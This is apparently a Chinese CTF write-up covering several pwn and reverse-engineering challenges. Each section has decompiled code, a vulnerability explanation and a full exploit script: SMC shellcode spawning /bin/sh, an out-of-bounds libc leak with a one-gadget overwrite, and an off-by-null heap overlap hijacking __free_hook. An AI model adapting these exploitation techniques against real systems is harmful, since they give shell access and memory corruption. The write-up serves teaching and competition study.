而这个其实是一个非常典型的shellcode但是在运行的时候我们可以知道我们可以rwx的空间是我们的程序段.因此这里我们使用的手法是通过修改程序段上的一个指令就可以拿到一个shellcode，这里用的手法其实就是一个smc（**Self-Modifying Code**自修改代码）的手法，然后我们故意修改canary就可以跳转到要给stack_chk_fail这个函数的验证位置，也就是04010B4这个位置，这里可以写入一个jl的一个小于跳转，因此我们使用这个手法进行一个绕过

exp:

```py
from pwn import*
#p=process('./closed_ended')
p=remote('34.84.25.24',50037)
#context.log_level='debug'
magic=0x4010B0+4
ret=0x4010B9
get_rwx=0x401070
#gdb.attach(p)
#pause()
p.sendline(str(hex(magic)).encode())
sleep(0.1)
p.sendline(p8(0x7C))
sleep(0.1)
payload=b'a'*(0x12-8)+p64(0xffffffffffff)+p64(0x401000+0x30)+p64(get_rwx)+p64(ret)+p64(0x401105)
p.sendline(payload)
#========================
sleep(0.1)
payload=b'a'*(0x12-8)+p64(0xffffffffffffffff)+p64(0x404510)+p64(0x401060)+p64(0x401070)
payload=payload.ljust(0x40,b'\x01')
payload+=b'\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05'
payload=payload.ljust(0x50,b'\x01')
payload+=b'/b/bin/sh\x0a'
p.sendline(payload)
sleep(0.1)
p.sendline(str('exec 1>&2').encode())
p.interactive()
```

总结：这个手法主要是使用的故意修改cnanary，并且修改jnz为jl来修改一个跳转的结果，是的我们写一个ret

## 浙江省赛初赛

### pwn1

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  _BYTE v3[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+58h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_401276(v3, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4012F9();
      __isoc99_scanf("%d", &n3);
      getchar();
      if ( n3 != 1 )
        break;
      sub_401339(v3);
    }
    if ( n3 == 2 )
    {
      sub_4013DF(v3);
    }
    else
    {
      if ( n3 == 3 )
        exit(0);
      puts("error!");
      fflush(stdin);
    }
  }
}
unsigned __int64 __fastcall sub_401339(__int64 a1)
{
  __int64 n9; // [rsp+18h] [rbp-38h]
  char s[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  n9 = *(a1 + 72);
  if ( n9 <= 9 )
  {
    puts("input your number:");
    fgets(s, 24, stdin);                        // 只能读入10次
    *(a1 + 8 * n9) = atoll(s);
    ++*(a1 + 72);
  }
  else
  {
    puts("input error");
  }
  return __readfsqword(0x28u) ^ v4;
}
unsigned __int64 __fastcall sub_4013DF(__int64 a1)
{
  __int64 n9; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index:");
  __isoc99_scanf("%lld", &n9);
  getchar();
  if ( n9 <= 9 )
  {
    puts("your number:");
    printf("%lld\n", *(a1 + 8 * n9));
    *(a1 + 8 * n9) = 0;                         // 没有验证n9为负数，这里读取完以后会在对这个位置的内容进行一个删除
    --*(a1 + 72);
  }
  else
  {
    puts("output error");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这里的漏洞就是n9没有验证负数因此出现了一个越界写和越界读

```py
from pwn import *
context.log_level='debug'
io = remote("45.40.247.139",15101)
# io = process("/home/fofa/rop/pwn")
libc = ELF("/home/fofa/rop/libc-2.31.so")

def input_1(content):
    io.sendlineafter(">>",'1')
    io.sendlineafter("input your number:",str(content))

def output_1(idx):
    io.sendlineafter(">>",'2')
    io.sendlineafter("index:",str(idx))


output_1(-13)
io.recvuntil("your number:\n")
read_libc = int(io.recv(15)) - libc.sym["puts"] - 0x17a
success(hex(read_libc))

output_1(9)
io.recvuntil("your number:\n")
count_val = int(io.recvline().strip())

success("number:" + str(count_val))
# DBG("b * 0x4013B1")

success("int:" + str(int(0x4f302 + read_libc)))

# input_1(int(0xe3b01 + read_libc))

input_1(int(0xe3b01 + read_libc))


io.interactive()
```

### re1

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int n20; // [esp+E8h] [ebp-12Ch]
  int v5; // [esp+100h] [ebp-114h]
  _WORD Buf2[130]; // [esp+10Ch] [ebp-108h] BYREF

  __CheckForDebuggerJustMyCode(&unk_452015);
  memset(Buf2, 0, 0x100u);
  sub_401550("Please input the flag and I will verify it: ");
  sub_4015C0("%256s", (const char *)Buf2);
  if ( IsDebuggerPresent() )
    _loaddll(0);
  v5 = sub_401000();
  for ( n20 = 0; n20 < 20; ++n20 )
  {
    Buf2[n20] += HIWORD(v5);
    Buf2[n20] ^= v5;
  }
  if ( !memcmp(&Buf1_, Buf2, 0x28u) )
    sub_401550("Right flag!\n");
  else
    sub_401550("Wrong flag\n");
  return 0;
}//这里我们可以知道buf1中是我们的一个对比内容因此我们直接是你用脚本进行一个爆破sub_401000的代码直接进行一个复现就可以了
```



```py
MASK32 = 0xFFFFFFFF
MASK16 = 0xFFFF
dword_45002C = 0x0C

def to_u32(x): return x & MASK32
def to_s32(x): x &= MASK32; return x if x < 0x80000000 else x - 0x100000000
def sub_401000():
    v6 = to_s32(-17958194)
    v5 = 0x7D7CC976
    for i in range(32):
        if (i & 0xAAAAAAAA) != 0:
            sh = 32 - (i % 32)
            v2 = (v5 >> sh) & MASK32 if sh != 32 else 0
        else:
            if (v5 & 1) != 0:
                v2 = (((v5 ^ 0xDEADCAFE) >> 1) + (v5 ^ 0x0B00B135)) & MASK32
            else:
                term1 = ((v5 >> 8) & 0xFF)
                term2 = (term1 << 8)
                term3 = ((v5 & 0xFF00) << 8)
                term4 = ((v5 & 0xFF) << 24)
                v1 = v5 ^ to_u32(term1 | term2 | term3 | term4)
                v2 = v1 & MASK32
        sh2 = i % 32
        v5 = to_u32(((v5 << sh2) & MASK32) | (v2 & MASK32))
        v3 = -1 if (v5 & 2) != 0 else 464371934
        mult = (i ^ 0xDEADBABE) & MASK32
        add = to_s32((v3 * mult) & MASK32)
        v6 = to_s32((v6 + add) & MASK32)

    X = (v5 & 0x0F0F0F0F) | (v6 & 0xF0F0F0F0)
    part1 = ((X >> 24) & 0xFF) | (((X >> 8) & 0xFF) << 8) | (((v5 & 0x0F00) | (v6 & 0xF000)) << 8) | (((v5 & 0x000F) | (v6 & 0x00F0)) << 24)
    part2 = (((X ^ 0xDEADBEEF) + dword_45002C + 11) & MASK32) ^ 0xFFFF0000
    A = to_u32(part1 ^ part2)
    A_masked = A & 0xDEAD0000
    res_high = (A_masked ^ 0xA600) & MASK32
    part_low = ((X >> 24) & 0xFF) | (((X >> 8) & 0xFF) << 8) | (((v5 & 0x0F00 | v6 & 0xF000) << 8) & MASK32)
    term16 = (((v5 & 0x0F0F | v6 & 0xF0F0) ^ 0xBEEF) + dword_45002C + 11) & MASK16
    result = (res_high | part_low) ^ term16
    return result & MASK32

def decrypt_flag(finals, lo, hi):

    out = bytearray()
    for w in finals:
        val = ((w ^ lo) - hi) & MASK16
        out.append(val & 0xFF)
        out.append((val >> 8) & 0xFF)
    return bytes(out)

def is_printable(s):
    return sum(1 for c in s if 32 <= ord(c) < 127) / max(1, len(s)) > 0.8

def main():

    unk_bytes = [
        0xE9, 0xA9, 0xF8, 0xA7, 0xF9, 0xA2, 0x20, 0xD6, 0x9A, 0xD6,
        0xC8, 0xD9, 0x99, 0xD3, 0xCB, 0x85, 0x9B, 0xD2, 0xC7, 0xD5,
        0x96, 0x84, 0xC9, 0xD4, 0x9A, 0xD8, 0xCA, 0xD7, 0x9C, 0xD5,
        0xC8, 0x85, 0x97, 0xD5, 0x9E, 0x85, 0x9C, 0xD4, 0xCA, 0x6D
    ]
    finals_le = [ (unk_bytes[i] | (unk_bytes[i+1]<<8)) & MASK16 for i in range(0,len(unk_bytes),2) ]

    v5 = sub_401000()
    print(f"[+] Computed v5 = 0x{v5:08X}")
    print(f"    HIWORD = 0x{(v5 >> 16) & MASK16:04X}, LOWORD = 0x{v5 & MASK16:04X}")

    candidates = []
    for lo_try in range(0, 1 << 16):
        expected_word = ord('D') | (ord('A') << 8)
        hi_try = ((finals_le[0] ^ lo_try) - expected_word) & MASK16
        pdata = decrypt_flag(finals_le, lo_try, hi_try)
        if b"DASCTF{" in pdata and b"}" in pdata:
            start = pdata.find(b'{')
            end = pdata.find(b'}', start)
            inner = pdata[start+1:end].decode('latin1', errors='replace')
            if is_printable(inner):
                candidates.append((lo_try, hi_try, inner))

    seen = set()
    for lo, hi, inner in candidates:
        if inner not in seen:
            seen.add(inner)
            print(f"[✓] Candidate: DASCTF{{{inner}}}  (lo=0x{lo:04X}, hi=0x{hi:04X})")

    if candidates:
        print("\n[✔] Recovered flag:")
        print(f"DASCTF{{{candidates[0][2]}}}")
    else:
        print("[!] No valid flag found.")

if __name__ == "__main__":
    main()

```

### pwn2

```c
unsigned __int64 edit()
{
  signed int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("which one?");
  __isoc99_scanf("%d", &v1);
  if ( (unsigned int)v1 > 8 || !*((_QWORD *)&clist + v1) )
  {
    puts("sorry");
    exit(1);
  }
  puts("what to change?");
  read(0, *((void **)&clist + v1), slist[v1] + 1);
  puts("Finish!");
  return __readfsqword(0x28u) ^ v2;
}//这里纯在一个offbynull
```

思路：

1.使用offbyone进行一个堆重叠

2.堆重叠以后就会泄露一些libc。

```py
from pwn import *
context.log_level='debug'
io = process("/home/fofa/pwn")
libc = ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6')

io.recvuntil("Let me know if u are not a rebot.")
num1=int(io.recv(3))
io.recvuntil("+")
num2=int(io.recv(2))
info("num1:"+str(num1))
info("num2:"+str(num2))

io.sendlineafter("=?",str(num2+num1))

def show(idx):
    io.sendlineafter("5.exit", '3')
    io.sendlineafter("which one?\n", str(idx))

def add(idx,size,content):
    io.sendlineafter("5.exit",'1')
    io.sendlineafter("the index of command?\n",str(idx))
    io.sendlineafter("the size of command?\n",str(size))
    io.sendlineafter("the command?\n",content)

def edit(idx,content):
    io.sendlineafter("5.exit", '4')
    io.sendlineafter("which one?\n", str(idx))
    io.sendlineafter("what to change?\n", content)
def delete(idx):
    io.sendlineafter("5.exit", '2')
    io.sendlineafter("which one?\n", str(idx))


add(1,0x28,'111')
add(2,0x28,'222')
add(3,0x18,'333')
add(4,0x18,'333')
add(5,0x18,'5555')
add(6,0x18,'6666')
add(7,0x410,'777')
add(8,0x10,'/bin/sh\x00')

delete(7)
edit(5,b'a'*0x18+b'\x41')
delete(6)
add(6,0x31,'a'*0x20)# edit(6,b'a'*0x18)
show(6)
io.recvuntil(b'a'*0x20)
libc.address = u64(io.recv(6)[-6:].ljust(8,b'\x00'))-0x3ebc0a
info("libc_base:"+hex(libc.address))
edit(1,b'a'*0x28+b'\x61')
# delete(4)
# delete(5)

delete(4)
delete(3)
delete(2)
add(2,0x50,b'a'*0x28+p64(0x31)+p64(libc.sym['__free_hook']))
add(3,0x18,p64(libc.sym['__free_hook']))
add(4,0x18,p64(libc.sym['system']))

delete(8)
# add()
# add(9,0x20,'999')
gdb.attach(io)
io.interactive()
```

